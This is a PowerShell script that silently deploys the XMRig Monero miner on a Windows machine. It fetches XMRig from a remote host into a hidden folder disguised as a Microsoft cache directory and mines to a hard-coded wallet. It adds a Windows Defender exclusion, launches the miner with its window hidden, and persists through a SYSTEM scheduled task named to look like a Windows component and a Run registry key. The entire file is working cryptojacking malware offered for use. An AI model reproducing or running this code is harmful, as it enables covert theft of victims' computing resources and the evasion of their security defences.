# XMRig Silent Deploy - DEBUG VERSION (full logging for troubleshooting)
$LogFile = "C:\ProgramData\Microsoft\Network\Cache\deploy.log"
function Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Add-Content -Path $LogFile -Force -Encoding UTF8
}

Log "=== DEBUG DEPLOY STARTED ==="
$InstallDir = "C:\ProgramData\Microsoft\Network\Cache"
Log "Install directory: $InstallDir"

if (-not (Test-Path $InstallDir)) {
    New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
    (Get-Item $InstallDir).Attributes += "Hidden"
    Log "Created and hidden install directory"
} else {
    Log "Install directory already exists"
}

$ZipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
$ZipPath = "$env:TEMP\xmrig.zip"
Log "Downloading from $ZipUrl"
try {
    Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath -UseBasicParsing -TimeoutSec 60
    Log "Download completed successfully"
} catch {
    Log "ERROR downloading: $_"
    throw
}

Log "Extracting ZIP..."
Expand-Archive -Path $ZipPath -DestinationPath $InstallDir -Force
Remove-Item $ZipPath -Force
Log "ZIP extracted and cleaned"

$Sub = Get-ChildItem $InstallDir -Directory | Where-Object { $_.Name -like "*xmrig*" } | Select-Object -First 1
if ($Sub) {
    Log "Moving files from subfolder $($Sub.Name)"
    Move-Item "$($Sub.FullName)\*" $InstallDir -Force
    Remove-Item $Sub.FullName -Recurse -Force
    Log "Subfolder cleaned"
}

$ExePath = (Get-ChildItem $InstallDir -Recurse -Filter "xmrig.exe" -File | Select-Object -First 1).FullName
Log "XMRig executable: $ExePath"

$ConfigPath = "$InstallDir\config.json"
$BatPath = "$InstallDir\start.bat"

$ComputerName = $env:COMPUTERNAME
$Wallet = "86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd"

$ConfigJson = @"
{
  "autosave": false,
  "colors": false,
  "cpu": { "enabled": true, "max-threads-hint": 60 },
  "donate-level": 0,
  "pools": [{
    "algo": "rx/0",
    "url": "pool.supportxmr.com:443",
    "user": "$Wallet",
    "pass": "x",
    "keepalive": true,
    "tls": true,
    "rig-id": "$ComputerName"
  }]
}
"@

[System.IO.File]::WriteAllText($ConfigPath, $ConfigJson, [System.Text.Encoding]::UTF8)
Log "config.json created with rig-id: $ComputerName"

$BatContent = @"
@echo off
cd /d "$InstallDir"
echo [%DATE% %TIME%] XMRig started by task >> "$InstallDir\xmrig.log"
start /B xmrig.exe -c config.json -B --no-color
"@
$BatContent | Out-File $BatPath -Encoding ASCII -Force
Log "start.bat created"

try {
    Add-MpPreference -ExclusionPath $InstallDir -ErrorAction Stop
    Log "Defender exclusion added"
} catch {
    Log "Defender exclusion skipped: $_"
}

Log "Starting miner in background now..."
Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$BatPath`"" -WindowStyle Hidden
Log "Miner launched (hidden)"

$TaskName = "MicrosoftNetworkCache"
Log "Creating scheduled task: $TaskName"
$Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$BatPath`""
$Trigger = New-ScheduledTaskTrigger -AtStartup

try {
    $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null
    Log "Scheduled task registered as SYSTEM"
} catch {
    Log "SYSTEM failed, using fallback: $_"
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Force | Out-Null
    Log "Fallback task registered"
}

Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $TaskName -Value "cmd.exe /c `"$BatPath`"" -Force
Log "Registry Run key added as extra persistence"

Log "=== DEBUG DEPLOY FINISHED SUCCESSFULLY ==="
Write-Output "DEBUG DEPLOY DONE - Check $LogFile"
